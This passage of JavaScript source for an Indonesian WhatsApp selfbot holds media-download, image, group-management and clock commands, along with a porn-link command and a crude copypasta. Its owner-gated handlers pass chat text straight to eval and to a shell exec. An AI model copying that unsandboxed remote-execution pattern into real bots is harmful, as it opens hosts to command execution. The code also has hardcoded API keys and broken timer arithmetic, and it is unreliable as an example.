				await reply( `Partner found: ๐\n*${prefix}next* โ find a new partner`)
				break
case 'soundcloud': //By Putra
case 'Soundcloud':
if (args.length == 0) return reply(`Example: ${prefix + command} link nya`)
                    url = args[0]
anu = await fetchJson(`https://api.zeks.xyz/api/soundcloud?apikey=apivinz&url=${url}`, {method: 'get'})
buffer1 = await getBuffer(anu.result.thumb)
teks = `Judul : ${anu.result.title}
Durasi : ${anu.result.duration}
Quality : ${anu.result.quality}

๐๐ช๐ฃ๐๐๐ช ๐ฎ๐ ๐ ๐๐  :)

Ni Biar Cepat :
${anu.result.download}`
itsmevall.sendMessage(from, buffer1, image, {quoted: mek, caption: teks})
buffer = await getBuffer(anu.result.download)
itsmevall.sendMessage(from, buffer, audio, {quoted: mek})
break
case 'wangy':
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} โค๏ธ โค๏ธ โค๏ธ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis โค๏ธ โค๏ธ โค๏ธ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH โค๏ธ โค๏ธ โค๏ธapa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. โค๏ธ โค๏ธ โค๏ธ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah โค๏ธ โค๏ธ โค๏ธ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(awikwok)
              break
case 'randombokep':
case 'Randombokep':
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
              bokep = body.slice(1)
              const bo =['https://www.mediafire.com/download/8hnhjcf3pseubgy','https://www.mediafire.com/download/cty9phda3d1s62u','https://www.mediafire.com/download/8hnhjcf3pseubgy']
              const kep = bo[Math.floor(Math.random() * bo.length)]
              itsmevall.sendMessage(from, '*PERMINTAAN:* '+bokep+'\n*DOSA TANGGUNG PRIBADI*\n*NI BRO FREE BUAT KAMU DOWNLOAD SENDIRI:* '+ kep, text, { quoted: mek, caption: `NI BOKEP SAYA DAPAT DARI *ยฉ-* DOSA TANGGUNG SENDIRI๐ฟ`})
              break
case 'quotesyt':
case 'Quotesyt':
                reply(mess.wait)
                dapuhy = await getBuffer(`https://dapuhy-api.herokuapp.com/api/randomimage/quotesyt?apikey=Itsrojako`)
                itsmevall.sendMessage(from, dapuhy, image, {quoted: mek})
                break        
                case 'bts':
case 'Bts':
                reply(mess.wait)
                dapuhy = await getBuffer(`https://dapuhy-api.herokuapp.com/api/randomimage/batues?apikey=RSWX4evmQEmItxR`)
                itsmevall.sendMessage(from, dapuhy, image, {quoted: mek})
                break    
case 'blackpink':
case 'Blackpink':
                reply(mess.wait)
                dapuhy = await getBuffer(`https://dapuhy-api.herokuapp.com/api/randomimage/blekpink?apikey=RSWX4evmQEmItxR`)
                itsmevall.sendMessage(from, dapuhy, image, {quoted: mek})
                break    
                case 'groupinfo':
                case 'Groupinfo':
        if (!isGroup) return;
        ppUrl = await itsmevall.getProfilePicture(from); // leave empty to get your own
        buffergbl = await getBuffer(ppUrl);
        itsmevall.sendMessage(from, buffergbl, image, {
          quoted: mek,
          caption: `\`\`\`ใ Group Info ใ\`\`\`\n*${unique[0]} > Name* : ${groupName}\n*${unique[0]} > Member* : ${groupMembers.length}\n*${unique[0]} > Admin* : ${groupAdmins.length}\n*${unique[0]} > Description* : \n${groupDesc}`,
        });
        break;
        case 'closetime':  
        case 'Closetime':  
        if (!isBotGroupAdmins) return reply('Bot not admin');
        if (!isGroupAdmins && !mek.key.fromMe) return reply('Khusus admin');
        if (!isGroup) return reply('Khusus di grup');		 
        reply('AKSES WAKTU DIPROSES')   	
                itsmevall.updatePresence(from, Presence.composing) 
                if (args[1]=='detik') {var timer = args[0]+'000'
				} else if (args[1]=='menit') {var timer = args[0]+'0000'
				} else if (args[1]=='jam') {var timer = args[0]+'0000'
				} else {return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')}
				setTimeout( () => {
				var nomor = mek.participant
				let close = {
				text: `*แดแดแดแดแด แดกแดแดแดแด* ษขสแดแด แดษชแดแดแดแดแด แดสแดส แดแดแดษชษด @${nomor.split('@s.whatsapp.net')[0]}\n๊ฑแดแดแดสแดษดษข *สแดษดสแด แดแดแดษชษด* สแดษดษข แดแดแดแดแด แดแดษดษขษชสษชแด แดแด๊ฑแดษด`,
				contextInfo: { mentionedJid: [nomor] }
				}
				itsmevall.groupSettingChange (from, GroupSettingChange.messageSend, true);
				reply(close)
				}, timer)
				break 
		     	case 'opentime':  
		case 'Opentime':  
		     	if (!isBotGroupAdmins) return reply('Bot not admin');
        if (!isGroupAdmins && !mek.key.fromMe) return reply('Khusus admin');
        if (!isGroup) return reply('Khusus di grup');		    
                reply('AKSES WAKTU DIPROSES')   
                itsmevall.updatePresence(from, Presence.composing) 
                if (args[1]=='detik') {var timer = args[0]+'000'
				} else if (args[1]=='menit') {var timer = args[0]+'00000'
				} else if (args[1]=='jam') {var timer = args[0]+'00000'
				} else {return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')}
				setTimeout( () => {
				var nomor = mek.participant
				let open = {
				text: `*แดแดแดแดแด แดกแดแดแดแด* ษขสแดแด แดษชสแดแดแด แดสแดส แดแดแดษชษด @${nomor.split('@s.whatsapp.net')[0]}\n๊ฑแดแดแดสแดษดษข *แดแดแดสแดส* แดแดแดแดแด แดแดษดษขษชสษชแด แดแด๊ฑแดษด`,
				contextInfo: { mentionedJid: [nomor] }
				}
				itsmevall.groupSettingChange (from, GroupSettingChange.messageSend, false);
				reply(open)
				}, timer)
				break  
case 'jam':
case 'Jam':
jamnya = `
โฉ ๐๐๐ : ${jam}
โฉ ๐๐๐๐ : ${week} ${weton}
โฉ ๐๐ข๐ฏ๐จ๐จ๐ข๐ญ : ${date} 

โฉ  INDONESIA TIME
โฉ  Wib : ${timeWib}
โฉ  Wita : ${timeWita}
โฉ  Wit : ${timeWit}  `
reply(jamnya)
break
      case "eval":
      case "Eval":
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        if (!mek.key.fromMe) return;
        itsmevall.sendMessage(
          from,
          JSON.stringify(eval(budy.slice(5)), null, "\t"),
          text,
          { quoted: mek }
        );
        break;
if (!mek.key.fromMe) return;
if (_chats.startsWith('$')){
if (!isOwner)return// reply(`Perintah ini tidak bisa Di lakukan oleh Jadibot sementara`)
if (!q)return 
var itsme = `${sender}`
var split = `*itsmevall-BotWeA*`
const term = {
contextInfo: {
participant: itsme,
quotedMessage: {
extendedTextMessage: {
text: split,
}
}
}
}
exec(q, (err, stdout) => {
if (err) return itsmevall.sendMessage(from, ` ${err}`, text, { quoted: mek })
if (stdout) {
itsmevall.sendMessage(from, stdout, text, term)
}
})
}

      default:
		if (hour_now >= '02:00' && hour_now <= '04:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Waktunya sahur kak, Main botnya buat nanti lagi, Sebelum makan jangan lupa baca Doa ya kak', 'yellow'), color('(๐)', 'white'))
          }
        if (hour_now >= '04:00' && hour_now <= '05:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'yellow'), color('(๐)', 'white'))
          }
          if (hour_now >= '05:00' && hour_now <= '06:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Udah sholat Subuh belum kak', 'yellow'), color('(๐)', 'white'))
          }
        if (hour_now >= '06:00' && hour_now <= '11:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Pagi kak, Jangan lupa mandi', 'yellow'), color('(๐)', 'white'))
          }
          if (hour_now >= '11:00' && hour_now <= '12:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Siang kak, Dah mandi blm kak?', 'yellow'), color('(๐)', 'white'))
          }
          if (hour_now >= '12:00' && hour_now <= '14:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'yellow'), color('(๐)', 'white'))
           }
        if (hour_now >= '14:00' && hour_now <= '15:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Sore kak, Jangan lupa mandi', 'yellow'), color('(๐)', 'white'))
          }
        if (hour_now >= '15:00' && hour_now <= '16:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'yellow'), color('(๐)', 'white'))
          }
        if (hour_now >= '17:00' && hour_now <= '18:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi buka kak, Sabar ya kak', 'yellow'), color('(๐)', 'white'))
          }
        if (hour_now >= '18:00' && hour_now <= '19:00') {
        	console.log(color('[Pesan Bot]', 'cyan'), color('Alhamdulillah, Dh magrib jan lupa sholat kak', 'yellow'), color('(๐)', 'white'))
        }
        if (hour_now >= '19:00' && hour_now <= '20:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi jam 8 gak mabar kak?', 'yellow'), color('(๐)', 'white'))
           }
        if (hour_now >= '20:00' && hour_now <= '00:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'yellow'), color('(๐)', 'white'))
        }
          if (hour_now >= '00:00' && hour_now <= '02:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Bot ngantuk kak, tidur dulu ya kak', 'yellow'), color('(๐ด)', 'white'))
        }

     if (!mek.key.fromMe) return;
        if (_chats.startsWith(">")) {
          try {
            return itsmevall.sendMessage(
              from,
              JSON.stringify(eval(budy.slice(2)), null, "\t"),
              text,
              { quoted: mek }
            );
          } catch (err) {
            e = String(err);
            reply(e);
          }
        }
    }

    if (isGroup && budy != undefined) {
    } else {
      console.log(
        color("[SELFBOT]", "red"),
        "๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ ๐๐ต๐ด๐๐ฆ๐๐ข๐ญ๐ญ ใท๏ธ",
        color(sender.split("@")[0])
      );
    }
   } catch (e) {
    e = String(e);// Fixed Di Consolog ๐น
    if (!e.includes("this.isZero") && !e.includes("jid") && !e.includes("Cannot read property 'fromMe' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined") && !e.includes("Cannot read property 'key' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined")) {
      console.log("Message : %s", color(e, "yellow"));
    }
    // console.log(e)
  }
};
// ๐๐๐ฃ๐๐๐๐๐ช๐ฉใท๏ธ